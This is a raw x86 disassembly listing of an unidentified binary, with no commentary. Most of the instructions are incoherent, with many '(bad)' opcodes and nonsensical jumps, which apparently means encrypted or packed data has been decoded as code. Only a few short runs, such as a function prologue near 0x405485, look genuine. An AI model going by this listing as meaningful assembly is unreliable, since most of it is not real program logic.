  405160:	jge    0x405106
  405162:	cmc    
  405163:	and    esi,ecx
  405165:	(bad)  
  405166:	mov    ss,esp
  405168:	gs inc ebp
  40516a:	jnp    0x40518f
  40516c:	xchg   BYTE PTR [esi],bl
  40516e:	push   ebp
  40516f:	arpl   cx,cx
  405171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405172:	cs dec ebx
  405174:	mov    BYTE PTR [edx+0x793cb0d6],0xe6
  40517b:	xchg   ecx,eax
  40517c:	mov    al,0xda
  40517e:	adc    edi,ebp
  405180:	fs add eax,0x2bd5201d
  405186:	in     al,0xde
  405188:	into   
  405189:	push   ebx
  40518a:	ds std 
  40518c:	test   DWORD PTR [ecx+edi*2],ebp
  40518f:	repnz add ebx,eax
  405192:	mov    bh,0x11
  405194:	pop    eax
  405196:	mov    al,0xb3
  405198:	dec    ebx
  405199:	jns    0x405164
  40519b:	adc    eax,0x114a5a9e
  4051a0:	adc    BYTE PTR [edi+0x4ff06255],bl
  4051a6:	pusha  
  4051a7:	enter  0x1510,0xfc
  4051ab:	or     bh,BYTE PTR [esi]
  4051ad:	repz ror ebx,1
  4051b0:	fcomp  DWORD PTR [eax-0x1e820d2b]
  4051b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b7:	pop    es
  4051b8:	jo     0x405145
  4051ba:	cs sbb edx,eax
  4051bd:	outs   dx,BYTE PTR ds:[esi]
  4051be:	mov    eax,0x99dc383
  4051c3:	aam    0xe1
  4051c5:	inc    eax
  4051c6:	clc    
  4051c7:	dec    ebp
  4051c8:	ins    BYTE PTR es:[edi],dx
  4051c9:	jbe    0x4051ca
  4051cb:	(bad)  
  4051cc:	sbb    ebp,DWORD PTR [esi+0x3a70869f]
  4051d2:	mov    ecx,0xdb996692
  4051d7:	mov    cl,ch
  4051d9:	push   ds
  4051da:	cwde   
  4051db:	and    BYTE PTR [ebx+0x46],cl
  4051de:	mov    ah,0x19
  4051e0:	jmp    0x40525c
  4051e2:	xchg   edx,eax
  4051e3:	mov    bl,0xc8
  4051e5:	addr16 in eax,0x6c
  4051e8:	xor    DWORD PTR [esi-0x13ec2a4],esi
  4051ee:	and    ebp,DWORD PTR [ebp+0x73]
  4051f1:	xchg   ebp,eax
  4051f2:	adc    ebx,edi
  4051f4:	xchg   edx,eax
  4051f5:	stc    
  4051f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051f7:	das    
  4051f8:	push   eax
  4051f9:	shr    ebp,cl
  4051fb:	and    eax,0x5917a41a
  405200:	and    BYTE PTR [ebx+0x4a],dl
  405203:	rol    DWORD PTR ds:[edi],1
  405206:	xor    eax,0xdbac71b6
  40520b:	and    BYTE PTR [ebx-0x3d],bl
  40520e:	and    BYTE PTR [eax+0x6d659fcf],0xc6
  405215:	add    eax,0x1400ad70
  40521a:	ins    BYTE PTR es:[edi],dx
  40521b:	jnp    0x4051f2
  40521d:	inc    ebp
  40521e:	push   edx
  40521f:	scas   al,BYTE PTR es:[edi]
  405220:	adc    eax,0xe709a5f3
  405225:	retf   0x7ef
  405228:	les    eax,FWORD PTR [eax-0x71939785]
  40522e:	jmp    0x873b719f
  405233:	(bad)  
  405234:	enter  0xf5a7,0xa1
  405238:	inc    ebx
  405239:	jne    0x4051e3
  40523b:	pop    esi
  40523c:	lea    esi,[eax+0x4ba9d86b]
  405242:	(bad)  
  405243:	(bad)  
  405244:	xchg   ebp,eax
  405245:	gs loopne 0x405259
  405248:	mov    ebx,0x209c828c
  40524d:	fnstcw WORD PTR [edx-0x18]
  405250:	bound  ebx,QWORD PTR [eax+0x6c]
  405253:	xor    dl,bl
  405255:	pop    es
  405256:	(bad)  
  405257:	adc    esi,DWORD PTR [eax+0x14b261b1]
  40525d:	jne    0x405222
  40525f:	xor    eax,0x39ed709d
  405264:	arpl   si,di
  405266:	leave  
  405267:	push   0x8ef48fff
  40526c:	out    dx,al
  40526d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526e:	mov    WORD PTR [eax+0xf],?
  405271:	repz adc bl,ah
  405274:	std    
  405275:	mov    ecx,0x428fb16a
  40527a:	rol    ch,0x6f
  40527d:	cmp    dh,BYTE PTR [ecx+0x22]
  405280:	add    bl,dl
  405282:	xor    al,0xe6
  405284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405285:	inc    ecx
  405286:	pop    eax
  405287:	inc    esi
  405288:	adc    DWORD PTR [edx-0x6c0b9243],ebx
  40528e:	loop   0x4052fc
  405290:	stos   DWORD PTR es:[edi],eax
  405291:	jge    0x40521d
  405293:	paddb  mm7,QWORD PTR [edx-0x51]
  405297:	ret    
  405298:	cmc    
  405299:	fcom   DWORD PTR [ebx]
  40529b:	call   0xa50826c7
  4052a0:	and    dl,BYTE PTR ds:0xb182412e
  4052a6:	fs push ebx
  4052a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052a9:	push   ebx
  4052aa:	jo     0x405251
  4052ac:	imul   eax,DWORD PTR [edi-0x49],0xffffff98
  4052b0:	cmp    BYTE PTR [edx-0x389032e3],bl
  4052b6:	mov    BYTE PTR [eax-0x6b],dl
  4052b9:	daa    
  4052ba:	inc    ebp
  4052bb:	cmp    al,0x43
  4052bd:	push   ecx
  4052be:	mov    ds:0x234b3d3f,al
  4052c3:	and    al,0xdf
  4052c5:	mov    esi,0x1adb93a0
  4052ca:	test   DWORD PTR [edi+0x4d712b11],eax
  4052d0:	fild   DWORD PTR ss:[ecx+0x5dfeb9b0]
  4052d7:	(bad)  
  4052d8:	les    esi,FWORD PTR [esi-0x59]
  4052db:	inc    edx
  4052dc:	mov    bl,0x38
  4052de:	in     eax,0xb4
  4052e0:	pop    ebx
  4052e1:	iret   
  4052e2:	sti    
  4052e3:	cdq    
  4052e4:	pop    eax
  4052e5:	dec    eax
  4052e6:	adc    al,0xda
  4052e8:	sbb    BYTE PTR [edx],bl
  4052ea:	xlat   BYTE PTR ds:[ebx]
  4052eb:	add    DWORD PTR [edi],ebp
  4052ed:	fsubr  QWORD PTR [eax+edx*2+0x4e]
  4052f1:	and    DWORD PTR [ebx+eiz*4+0x4d808571],0x38
  4052f9:	scas   eax,DWORD PTR es:[edi]
  4052fa:	sbb    DWORD PTR [edi],edi
  4052fc:	fild   QWORD PTR [edi]
  4052fe:	push   edx
  4052ff:	out    dx,eax
  405300:	push   ebx
  405301:	dec    eax
  405302:	push   ecx
  405303:	leave  
  405304:	sbb    dl,BYTE PTR [eax-0xc]
  405307:	sbb    DWORD PTR [edx-0x60],ebx
  40530a:	jge    0x4052e9
  40530c:	imul   esi,DWORD PTR [edx+0x49],0x47009b25
  405313:	loopne 0x405375
  405315:	pop    ebp
  405316:	pop    eax
  405317:	adc    al,0x22
  405319:	jmp    0x40534b
  40531b:	(bad)  
  40531c:	sti    
  40531d:	ficomp WORD PTR [bx+di-0x3849]
  405322:	pop    esp
  405323:	scas   al,BYTE PTR es:[edi]
  405324:	mov    ah,0x14
  405326:	popa   
  405327:	or     ecx,DWORD PTR [edx]
  405329:	ret    
  40532a:	sbb    esi,DWORD PTR [edx+0x6e]
  40532d:	adc    BYTE PTR [edi-0x59],cl
  405330:	arpl   WORD PTR ss:[edi],dx
  405333:	pop    ss
  405334:	push   esp
  405335:	or     dl,BYTE PTR [eax+ebx*8-0x67e4e618]
  40533c:	inc    esp
  40533d:	pop    ds
  40533e:	xchg   ebp,eax
  40533f:	stos   DWORD PTR es:[edi],eax
  405340:	add    DWORD PTR ds:0xe9be4af1,ebx
  405346:	ficom  DWORD PTR [ebp+0x1f7f4f97]
  40534c:	nop
  40534d:	in     eax,0xf7
  40534f:	jae    0x4053bc
  405351:	pop    esp
  405352:	pushf  
  405353:	dec    esi
  405354:	cmp    BYTE PTR [edi-0x19],0x36
  405358:	repnz addr16 push 0x983d1277
  40535f:	push   eax
  405360:	push   cs
  405361:	xchg   BYTE PTR [ecx-0x1b],ah
  405364:	mov    DWORD PTR [eax+ecx*1-0x1f4a4a85],ebx
  40536b:	je     0x4053ad
  40536d:	inc    ecx
  40536e:	loopne 0x405369
  405370:	jns    0x40530e
  405372:	push   ds
  405373:	inc    ecx
  405374:	jp     0x4053cc
  405376:	test   eax,0xa6f7699f
  40537b:	push   eax
  40537c:	pop    es
  40537d:	pop    es
  40537e:	cmp    dh,bl
  405380:	sbb    ch,BYTE PTR [eax-0x46]
  405383:	xchg   BYTE PTR [eax+0x28],cl
  405386:	jno    0x405356
  405388:	dec    ecx
  405389:	dec    eax
  40538a:	add    DWORD PTR [ecx+0x41cc3155],ebx
  405390:	inc    ebx
  405391:	dec    esp
  405392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405393:	inc    ebp
  405394:	je     0x4053f0
  405396:	mov    ebx,0x6dd5e9c
  40539b:	mov    esp,0xd9e11c04
  4053a0:	rcl    BYTE PTR [ebp-0x3ca09be3],cl
  4053a6:	cmp    al,0xd0
  4053a8:	pop    edi
  4053a9:	out    0xf2,al
  4053ab:	xlat   BYTE PTR ds:[ebx]
  4053ac:	jne    0x40532f
  4053ae:	popf   
  4053af:	into   
  4053b0:	add    DWORD PTR [esi-0x3c621234],0xffffff86
  4053b7:	dec    ebp
  4053b8:	std    
  4053b9:	push   edx
  4053ba:	(bad)  
  4053bb:	dec    ecx
  4053bc:	mov    ecx,0x53c3f04d
  4053c1:	mov    esp,0x3a39de80
  4053c6:	cmp    DWORD PTR [edi-0x4927301a],edi
  4053cc:	xor    BYTE PTR [esi],ah
  4053ce:	sbb    BYTE PTR [ebx-0x5d1f7bbd],al
  4053d4:	(bad)  
  4053d5:	call   eax
  4053d7:	inc    esi
  4053d8:	out    0xaf,al
  4053da:	ret    0x3e33
  4053dd:	jne    0x4053ac
  4053df:	bound  edi,QWORD PTR [ebx+0x7c27302a]
  4053e5:	xchg   bh,bh
  4053e7:	je     0x405458
  4053e9:	es ds ss jge 0x405416
  4053ee:	jb     0x405417
  4053f0:	or     DWORD PTR [edi+eiz*8-0x13e11eba],ebp
  4053f7:	mov    BYTE PTR [esi-0x50],0xf
  4053fb:	rcl    edi,1
  4053fd:	push   ebp
  4053fe:	push   esp
  4053ff:	aad    0x29
  405401:	mov    eax,ds:0x6ef21e9a
  405406:	shr    esi,cl
  405408:	(bad)  
  405409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540a:	xor    BYTE PTR [edi],dl
  40540c:	add    DWORD PTR [esi-0x4e60c150],eax
  405412:	mov    cs,WORD PTR gs:[ebp+0x24c57cd0]
  405419:	fcom   DWORD PTR [ebx]
  40541b:	mov    DWORD PTR [ecx+eax*8+0x6c91a802],0x64b1e932
  405426:	xchg   ebx,ebx
  405428:	fs adc eax,edx
  40542b:	out    0x2b,eax
  40542d:	and    edx,edx
  40542f:	(bad)  
  405430:	repz inc ebp
  405432:	push   esp
  405433:	xor    eax,0xc65efa71
  405438:	mov    bh,bl
  40543a:	and    ebx,DWORD PTR [edi]
  40543c:	fcmovne st,st(1)
  40543e:	je     0x405414
  405440:	ficom  DWORD PTR [eax]
  405442:	mov    al,0x9c
  405444:	arpl   WORD PTR [esi+0x44],bp
  405447:	cmp    bh,bh
  405449:	jecxz  0x4054a8
  40544b:	out    0x2e,eax
  40544d:	jbe    0x4054a1
  40544f:	outs   dx,BYTE PTR ds:[esi]
  405450:	xor    al,cl
  405452:	push   eax
  405453:	and    BYTE PTR [ebx+esi*4+0x2e],ah
  405457:	(bad)  
  405458:	in     eax,0x62
  40545a:	lahf   
  40545b:	or     esp,ecx
  40545d:	lods   al,BYTE PTR ds:[esi]
  40545e:	call   0x9f38:0xcf1adb58
  405465:	jae    0x405478
  405467:	nop
  405468:	add    ebx,ebx
  40546a:	pop    edi
  40546b:	clc    
  40546c:	xor    BYTE PTR [eax],0x9b
  40546f:	fimul  WORD PTR [ecx-0x4f57bd50]
  405475:	lods   al,BYTE PTR ds:[esi]
  405476:	fwait
  405477:	lods   eax,DWORD PTR ds:[esi]
  405478:	mov    bl,0x80
  40547a:	pushf  
  40547b:	push   ebx
  40547c:	(bad)  
  40547d:	iret   
  40547e:	sbb    DWORD PTR [esi+ebx*2+0xcc2c9],ebp
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e804
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e76b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	cmc    
  4054a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054aa:	mov    ah,0x1e
  4054ac:	adc    BYTE PTR [edi],dh
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405508
  4054b5:	push   esi
  4054b6:	inc    edi
  4054b7:	mov    cs,ebx
  4054b9:	outs   dx,BYTE PTR ds:[esi]
  4054ba:	out    0x43,eax
  4054bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054bd:	inc    esi
  4054be:	in     al,0x9f
  4054c0:	ins    DWORD PTR es:[edi],dx
  4054c1:	cli    
  4054c2:	test   al,0x92
  4054c4:	pop    edi
  4054c5:	cmp    eax,0x21651ff9
  4054ca:	mov    ah,BYTE PTR [ebp-0x1a]
  4054cd:	addr16 mov dh,0xb1
  4054d0:	mov    cl,0xe6
  4054d2:	sbb    bl,dl
  4054d4:	cmp    ebx,esi
  4054d6:	adc    BYTE PTR ds:0x560a3312,0x34
  4054dd:	cdq    
  4054de:	add    eax,0xd028f64a
  4054e3:	(bad)  
  4054e4:	or     DWORD PTR [ecx],ebx
  4054e6:	cmc    
  4054e7:	jae    0x405516
  4054e9:	xor    eax,0xb19c49d2
  4054ee:	pop    esp
  4054ef:	pop    esi
  4054f0:	mov    dh,0xee
  4054f2:	pop    es
  4054f3:	adc    DWORD PTR [ebx-0x17],ebp
  4054f6:	retf   
  4054f7:	inc    esi
  4054f8:	scas   al,BYTE PTR es:[edi]
  4054f9:	adc    al,0x56
  4054fb:	cdq    
  4054fc:	call   0xc08c99cf
  405501:	or     edi,edi
  405503:	ror    DWORD PTR [eax],cl
  405505:	mov    BYTE PTR [eax-0x61e44197],ch
  40550b:	dec    ecx
  40550c:	pop    edi
  40550d:	xchg   esp,eax
  40550e:	jg     0x405580
  405510:	fsubr  QWORD PTR [eax]
  405512:	scas   al,BYTE PTR es:[edi]
  405513:	and    al,0xd5
  405515:	mov    ds:0xe52f6d66,eax
  40551a:	jg     0x4054e4
  40551c:	cmp    eax,0x89af3a26
  405521:	xlat   BYTE PTR ds:[ebx]
  405522:	cmp    ebp,eax
  405524:	test   BYTE PTR [edx-0x36],dl
  405527:	inc    ecx
  405528:	pop    ebp
  405529:	and    bh,BYTE PTR [ebx+esi*2+0x49017736]
  405530:	jp     0x4055ae
  405532:	push   DWORD PTR [esi+0x58540353]
  405538:	lods   al,BYTE PTR ds:[esi]
  405539:	aaa    
  40553a:	and    bh,BYTE PTR ds:0xfdf21d19
  405540:	stos   DWORD PTR es:[edi],eax
  405541:	in     al,dx
  405542:	jo     0x40552f
  405544:	mov    bl,0xc8
  405546:	ror    DWORD PTR [edx],cl
  405548:	inc    eax
  405549:	daa    
  40554a:	das    
  40554b:	xchg   ebx,eax
  40554c:	xchg   DWORD PTR [esp+ebp*2+0x71ae83d5],eax
  405553:	fwait
  405554:	cmp    al,0xaa
  405556:	xchg   esp,eax
  405557:	mov    esp,0x365caeb7
  40555c:	loop   0x405586
  40555e:	out    0xf7,al
  405560:	sti    
  405561:	xchg   esp,eax
  405562:	es lock in al,dx
  405565:	add    ebx,eax
  405567:	stos   BYTE PTR es:[edi],al
  405568:	add    BYTE PTR [edx-0x445f3d8],0x15
  40556f:	neg    BYTE PTR [ebx-0x3ffb4f12]
  405575:	in     al,0x55
  405577:	inc    edi
  405578:	fisttp WORD PTR [edx]
  40557a:	fldcw  WORD PTR [ecx+0x3f397f2f]
  405580:	(bad)  
  405581:	mov    ds:0xd9d93395,ax
  405587:	and    ebp,esp
  405589:	cmp    edx,ebx
  40558b:	ins    DWORD PTR es:[edi],dx
  40558c:	add    ebx,DWORD PTR [ebx+esi*8]
  40558f:	xchg   esp,eax
  405590:	pusha  
  405591:	sbb    esp,DWORD PTR [esp+ebx*4+0x66aabbda]
  405598:	xchg   esp,eax
  405599:	in     eax,0x2f
  40559b:	sar    BYTE PTR [ecx],cl
  40559d:	inc    esp
  40559e:	adc    BYTE PTR [ecx*4-0x59bd6b16],bl
  4055a5:	add    ebp,edi
  4055a7:	or     BYTE PTR [eax],dh
  4055a9:	push   edi
  4055aa:	mov    ds:0x89c0bd6c,eax
  4055af:	cmp    al,dl
  4055b1:	mov    dl,0x81
  4055b3:	mov    eax,ds:0x8523f89b
  4055b8:	push   0xc2d7d352
  4055bd:	ja     0x4055a0
  4055bf:	pop    ss
  4055c0:	adc    DWORD PTR [edx],edi
  4055c2:	ins    BYTE PTR es:[edi],dx
  4055c3:	das    
  4055c4:	push   edi
  4055c5:	xor    bl,ah
  4055c7:	sbb    DWORD PTR [ebx-0x2b],esi
  4055ca:	ja     0x405565
  4055cc:	push   cs
  4055cd:	push   eax
  4055ce:	add    ecx,DWORD PTR [ebx-0x3b56d863]
  4055d4:	jle    0x405634
  4055d6:	outs   dx,DWORD PTR ds:[esi]
  4055d7:	xor    eax,DWORD PTR [esi+0x2e]
  4055da:	mov    ds:0x645bb106,eax
  4055df:	stos   DWORD PTR es:[edi],eax
  4055e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055e1:	leave  
  4055e2:	adc    BYTE PTR [edx-0x15],al
  4055e5:	pushf  
  4055e6:	retf   
  4055e7:	loop   0x40561b
  4055e9:	daa    
  4055ea:	out    0x80,al
  4055ec:	pop    es
  4055ed:	aas    
  4055ee:	ret    
  4055ef:	pop    esi
  4055f0:	jb     0x40566c
  4055f2:	aas    
  4055f3:	mov    esp,ecx
  4055f5:	or     BYTE PTR [ecx],dh
  4055f7:	jg     0x4055c8
  4055f9:	ins    BYTE PTR es:[edi],dx
  4055fa:	scas   eax,DWORD PTR es:[edi]
  4055fb:	push   0xffffffb5
  4055fd:	in     al,0x78
  4055ff:	aad    0xd9
  405601:	push   0x50
  405603:	arpl   cx,di
  405605:	add    ebp,esi
  405607:	repnz mov WORD PTR [ecx],gs
  40560a:	cli    
  40560b:	(bad)
  40560e:	pop    edi
  40560f:	inc    edx
  405610:	inc    DWORD PTR [edi]
  405612:	push   ebx
  405613:	scas   eax,DWORD PTR es:[edi]
  405614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405615:	sbb    BYTE PTR [ecx],ch
  405617:	lahf   
  405618:	ror    edi,1
  40561a:	sub    DWORD PTR [edx-0x59bbda52],esi
  405620:	push   es
  405621:	or     ch,BYTE PTR [edi]
  405623:	sub    DWORD PTR [esi+edx*1-0x3bcfa854],ecx
  40562a:	sbb    bl,BYTE PTR [edx+0xdc5cde1]
  405630:	repnz mov cl,0x9c
  405633:	mov    WORD PTR [ebx-0x13b30081],fs
  405639:	inc    esi
  40563a:	int3   
  40563b:	sti    
  40563c:	outs   dx,DWORD PTR ds:[esi]
  40563d:	rcr    DWORD PTR [ecx],cl
  40563f:	xor    bh,BYTE PTR [ebx-0x76d80714]
  405645:	mov    ch,dl
  405647:	sbb    eax,0x98e482d6
  40564c:	fisttp WORD PTR [esi]
  40564e:	pop    edx
  40564f:	mov    ebp,0x94da4df9
  405654:	mov    dl,BYTE PTR [edi]
  405656:	or     al,0xd9
  405658:	jecxz  0x4055f2
  40565a:	inc    ebp
  40565b:	icebp  
  40565c:	push   ebp
  40565d:	mov    cl,0xef
  40565f:	mov    ecx,0x31ac2e3d
  405664:	add    bh,BYTE PTR [eax+0x39]
  405667:	push   esp
  405668:	dec    esi
  405669:	xchg   edx,eax
  40566a:	xor    esi,ebx
  40566c:	test   BYTE PTR [edi+0x1f909d54],ah
  405672:	es ins DWORD PTR es:[edi],dx
  405674:	mov    ch,0xc7
  405676:	inc    DWORD PTR ds:0xd8afd87a
  40567c:	pop    ss
  40567d:	out    dx,al
  40567e:	cld    
  40567f:	push   ss
  405680:	je     0x405684
  405682:	ins    BYTE PTR es:[edi],dx
  405683:	cmp    al,0x18
  405685:	ja     0x4056d2
  405687:	bound  ecx,QWORD PTR ds:0xb6ad482c
  40568d:	inc    ebx
  40568e:	ds push ebx
  405690:	test   eax,0x4ef5c021
  405695:	sahf   
  405696:	adc    BYTE PTR [eax+0x43728309],0xe7
  40569d:	mov    edi,cr5
  4056a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a1:	scas   eax,DWORD PTR es:[edi]
  4056a2:	popa   
  4056a3:	add    eax,0xc3bb6af6
  4056a8:	or     eax,0x7178c96a
  4056ad:	rol    BYTE PTR [eax+0x6f],0x5b
  4056b1:	mov    bl,0xd7
  4056b3:	daa    
  4056b4:	popa   
  4056b5:	pop    ebp
  4056b6:	pop    es
  4056b7:	adc    al,0x19
  4056b9:	push   esp
  4056ba:	ss in  al,dx
  4056bc:	or     ecx,esp
  4056be:	outs   dx,DWORD PTR ds:[esi]
  4056bf:	add    DWORD PTR [edx],esp
  4056c1:	xchg   edi,eax
  4056c2:	(bad)  
  4056c3:	test   al,0xc8
  4056c5:	or     eax,0x65db0517
  4056ca:	into   
  4056cb:	enter  0xd8e6,0x62
  4056cf:	and    ecx,DWORD PTR [ecx+0xb635a65]
  4056d5:	call   FWORD PTR [edx]
  4056d7:	mov    ch,0x94
  4056d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056da:	mov    edi,0xe47bfe6
  4056df:	xor    al,0xbf
  4056e1:	arpl   WORD PTR [ebp+0x2b],bp
  4056e4:	shl    DWORD PTR ds:0xc31a2407,cl
  4056ea:	cmp    ebx,DWORD PTR [esi]
  4056ec:	int3   
  4056ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ee:	or     cl,BYTE PTR [edx+0x4d]
  4056f1:	cwde   
  4056f2:	adc    eax,0xc98ede19
  4056f7:	nop
  4056f8:	dec    esp
  4056f9:	or     eax,0xf8e188e0
  4056fe:	ja     0x405718
  405700:	ret    
  405701:	cld    
  405702:	test   al,0xcc
  405704:	dec    esp
  405705:	dec    ecx
  405706:	xor    eax,0xb8a2d6e2
  40570b:	mov    ds:0x53118cf,al
  405710:	jnp    0x40574c
  405712:	inc    ebx
  405713:	inc    edi
  405714:	aaa    
  405715:	inc    esi
  405716:	push   ss
  405717:	loopne 0x405775
  405719:	test   eax,edi
  40571b:	fimul  WORD PTR [eax+0xb85f788]
  405721:	add    edi,eax
  405723:	push   cs
  405724:	xchg   esp,eax
  405725:	scas   al,BYTE PTR es:[edi]
  405726:	inc    BYTE PTR [ebp+0x47d15179]
  40572c:	mov    ds:0xe9de24ff,eax
  405731:	test   eax,0xcdabf2ca
  405736:	mov    cl,BYTE PTR [edx+0x38]
  405739:	push   esp
  40573a:	loopne 0x40574b
  40573c:	jmp    FWORD PTR [ecx+ebx*1+0x46b82499]
  405743:	and    BYTE PTR [esi],ah
  405745:	pop    ecx
  405746:	mov    dh,0x35
  405748:	cmp    edx,eax
  40574a:	and    al,0xa
  40574c:	mov    bl,0xe1
  40574e:	mov    cl,0x31
  405750:	sub    DWORD PTR [edx-0x7938b1df],eax
  405756:	test   DWORD PTR [edi-0x6f],ecx
  405759:	cmp    ebx,eax
  40575b:	mov    ah,0xd2
  40575d:	fdivr  DWORD PTR [ecx]
  40575f:	sar    ch,cl
  405761:	xchg   ecx,eax
  405762:	stos   DWORD PTR es:[edi],eax
  405763:	push   eax
  405764:	and    DWORD PTR [ebx+0x496c03c1],esi
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fe06
  405772:	and    eax,DWORD PTR ds:0x42fdfa
  405778:	mov    ds:0x42fe06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x7ee46e42],eax
  405790:	inc    ecx
  405791:	sahf   
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	pop    edx
  40579b:	dec    ebp
  40579c:	cli    
  40579d:	push   ds
  40579e:	add    DWORD PTR ds:0x408dffd3,edi
  4057a4:	fdivr  DWORD PTR [edx+ebp*4-0x29]
  4057a8:	(bad)  
  4057a9:	jb     0x405734
  4057ab:	sub    BYTE PTR [esi],ah
  4057ad:	sbb    eax,0xa8014948
  4057b2:	mov    eax,ds:0x660b10f0
  4057b7:	add    al,0x51
  4057b9:	or     BYTE PTR [ebp+0x475abef1],bl
  4057bf:	adc    DWORD PTR [ebx-0x569c5647],edx
  4057c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c6:	cmp    al,0x7c
  4057c8:	mov    ds:0x7165eb19,eax
  4057cd:	in     eax,0xd2
  4057cf:	frstor [ebp-0x7f]
  4057d2:	mov    ds:0x81037320,eax
  4057d7:	leave  
  4057d8:	lods   eax,DWORD PTR ds:[esi]
  4057d9:	push   ebx
  4057da:	jnp    0x40583d
  4057dc:	das    
  4057dd:	inc    ebx
  4057de:	ja     0x4057b5
  4057e0:	xchg   ebp,eax
  4057e1:	adc    eax,0x395892b5
  4057e6:	dec    ebx
  4057e7:	sti    
  4057e8:	ins    DWORD PTR es:[edi],dx
  4057e9:	mov    dh,0x82
  4057eb:	add    al,0xf2
  4057ed:	push   0xffffffb7
  4057ef:	js     0x405821
  4057f1:	jb     0x4057ae
  4057f3:	mov    bh,0x65
  4057f5:	xchg   edi,eax
  4057f6:	mov    dh,0x4
  4057f8:	xchg   ebx,eax
  4057f9:	jmp    0x5d929fba
  4057fe:	or     BYTE PTR [esi+0x71],ch
  405801:	cmp    al,0x58
  405803:	(bad)  
  405804:	shl    bh,cl
  405806:	mov    esp,0x3de05919
  40580b:	cmc    
  40580c:	inc    ebp
  40580d:	xchg   esp,eax
  40580e:	fisubr DWORD PTR [edx-0xa]
  405811:	xchg   DWORD PTR [esi+0x792921f9],esi
  405817:	push   esi
  405818:	push   edx
  405819:	fldlg2 
  40581b:	ins    BYTE PTR es:[edi],dx
  40581c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40581d:	hlt    
  40581e:	int    0xa7
  405820:	or     DWORD PTR [eax-0x1b],edi
  405823:	arpl   WORD PTR [esi],si
  405825:	test   al,0x2d
  405827:	add    eax,0x8f585680
  40582c:	xchg   edx,eax
  40582d:	arpl   WORD PTR [eax+0x63f8507e],si
  405833:	adc    al,0x57
  405835:	dec    ebx
  405836:	push   0x6a
  405838:	(bad)  
  405839:	pop    ds
  40583a:	push   esp
  40583b:	jo     0x405889
  40583d:	push   ds
  40583e:	or     al,0x3e
  405840:	mov    BYTE PTR [ebx-0x61],dl
  405843:	or     DWORD PTR [ebp-0x2c],ecx
  405846:	out    dx,al
  405847:	xor    eax,0x737adfe8
  40584c:	add    esp,esp
  40584e:	sub    DWORD PTR [ecx-0x6a83e635],edx
  405854:	pop    ss
  405855:	sahf   
  405856:	in     al,dx
  405857:	mov    BYTE PTR [esi+0x4c29a807],cl
  40585d:	jecxz  0x405858
  40585f:	sub    ecx,esi
  405861:	dec    ebp
  405862:	mov    WORD PTR ss:[eax-0x31c55c04],gs
  405869:	mov    ecx,0x52c09fae
  40586e:	mov    BYTE PTR [ebx],al
  405870:	mov    ds:0x50e3fdcd,eax
  405875:	jecxz  0x405881
  405877:	cli    
  405878:	mov    gs,WORD PTR [esi-0x6bbc8ee1]
  40587e:	shr    BYTE PTR [ebp-0x510a9db],0xd7
  405885:	gs jmp 0x4058ca
  405888:	into   
  405889:	cmc    
  40588a:	cmp    ecx,esi
  40588c:	cmp    al,0x50
  40588e:	mov    DWORD PTR [ecx-0x54d9f82e],ecx
  405894:	jmp    0x6939:0xdcca8e46
  40589b:	push   cs
  40589c:	in     al,0xc4
  40589e:	dec    ecx
  40589f:	cwde   
  4058a0:	mov    BYTE PTR [esi-0x42],ch
  4058a3:	verr   WORD PTR [eax+eax*2-0x2768e62f]
  4058ab:	in     al,dx
  4058ac:	xlat   BYTE PTR ds:[ebx]
  4058ad:	jno    0x4058c0
  4058af:	cld    
  4058b0:	xor    esp,ebx
  4058b2:	sub    eax,0x17702092
  4058b7:	out    dx,al
  4058b8:	cwde   
  4058b9:	ret    
  4058ba:	shr    BYTE PTR [eax],0x66
  4058bd:	(bad)  
  4058be:	cmc    
  4058bf:	and    eax,0x578890d9
  4058c4:	xor    bh,BYTE PTR [edi-0x7]
  4058c7:	adc    DWORD PTR [edx-0x30],edi
  4058ca:	and    esi,DWORD PTR [edx]
  4058cc:	cwde   
  4058cd:	xchg   BYTE PTR [edi-0x17],bh
  4058d0:	pop    ds
  4058d1:	adc    al,0xf5
  4058d3:	cmp    eax,0x4af43b5
  4058d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d9:	pop    ds
  4058da:	mov    eax,ds:0x19ec03fd
  4058df:	cmc    
  4058e0:	shr    BYTE PTR [ecx+eax*4+0x20],cl
  4058e4:	mov    cl,0x4e
  4058e6:	(bad)  
  4058e7:	int    0xf6
  4058e9:	nop
  4058ea:	fadd   DWORD PTR [edx]
  4058ec:	cmp    DWORD PTR [edx+0x3f958c8],ebp
  4058f2:	cwde   
  4058f3:	leave  
  4058f4:	pop    esp
